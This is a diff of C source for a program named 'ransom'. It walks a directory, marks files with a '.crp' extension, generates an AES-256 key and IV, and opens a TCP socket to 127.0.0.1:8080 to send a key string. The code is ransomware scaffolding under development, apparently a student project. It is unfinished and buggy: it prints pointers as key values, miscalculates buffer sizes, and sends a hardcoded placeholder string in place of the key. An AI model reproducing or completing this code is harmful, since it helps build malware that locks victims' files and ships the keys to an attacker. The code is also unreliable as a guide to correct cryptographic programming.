@@ -20,6 +20,7 @@ int is_encrypted(char *filename)
 	for(int i=0; i<5;i++)
 	{
 		extention[i] = filename[n+i];
+	
 	}
 
 	if(strcmp(extention,".crp")==0)
@@ -69,30 +70,39 @@ void listdir(const char *name)
 	closedir(dir);
 }
 
-//int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
-int generate_key(int sizeKey)
+int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
 {
-	// int sizeKey[100];
-	// printf("Quel est la taille de la clé ? ");
-	// scanf("%s", sizeKey);
+	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
+	{
+		// fprintf(stderr, "L'erreur est %s\n", strerror(errno));
+		// return errno;
+		handleErrors();
+	}
 	
-	char buf[100];
-	sprintf(buf,"%d", sizeKey);
+	printf("La clé : %d  l'IV : %d \n",key, iv);
 	
-	char command[100];
-	stpcpy(command, "openssl rand -hex ");
-	strcat(command, buf);
-	system(command);
+	bytes_to_hexa(pKey , key, sizeKey);
+	printf("La clé en hexa : %X\n", key);
+	hexa_to_bytes(pKey, key, sizeKey);
+	printf("La clé en byte : %d\n", key);
+	
+	bytes_to_hexa(pIv , iv, sizeIv);
+	printf("L'IV en hexa : %X\n", iv);
+	hexa_to_bytes(pIv, iv, sizeIv);
+	printf("L'IV  en byte : %d\n", iv);
+	
+	// OPENSSL_cleanse(key,sizeof(key));	
+	// OPENSSL_cleanse(iv,sizeof(iv));
 }
 
 //int send_key(char *pKey, char *pIv);
-int send_key()
+int send_key(char *pKey)
 {
-	int sockid;
-	// char buffer[MAXLINE];
+		int sockid;
+
         int server_port = 8080;
         char *server_ip = "127.0.0.1";
-	char *hello = "clé : JeSuisVraimentCon";
+		char *key = "clé : JeSuisVraimentCon";
 		
         sockid = socket(AF_INET,SOCK_STREAM,0);
 
@@ -108,10 +118,13 @@ int send_key()
 		exit(0);
 	}
 	else
+	{
 		printf("Connected to the server !\n");
-		send(sockid, (const char *)hello, strlen(hello),0);
-
+		// printf("%d\n", pKey);
+		send(sockid, (const char *)key, strlen(key),0);
+	
         close(sockid);
+	}
 }
 
 int main (int argc, char * argv[])
@@ -119,13 +132,23 @@ int main (int argc, char * argv[])
 	usage();
 	if(argc==1)
 	{
-		printf("./e <PATH>");
+		printf("./ransom <PATH>");
+		handleErrors();
 	}
 	else if(argc==2)
 	{
 		printf("The directory is %s\n", argv[1]);
 		listdir(argv[1]);
-		generate_key(8);
-		send_key();
+		unsigned char key[AES_256_KEY_SIZE+1];
+		unsigned char iv[AES_BLOCK_SIZE+1];
+
+		int sizeKey = AES_256_KEY_SIZE; 
+		int sizeIv = AES_BLOCK_SIZE;
+		
+		char * pKey = (char *) malloc(sizeof((sizeKey)*2)+1);
+		char * pIv = (char *) malloc(sizeof(sizeIv));
+
+		generate_key(key, sizeKey, iv, sizeIv,pKey, pIv);
+		send_key(pKey);
 	}
 }
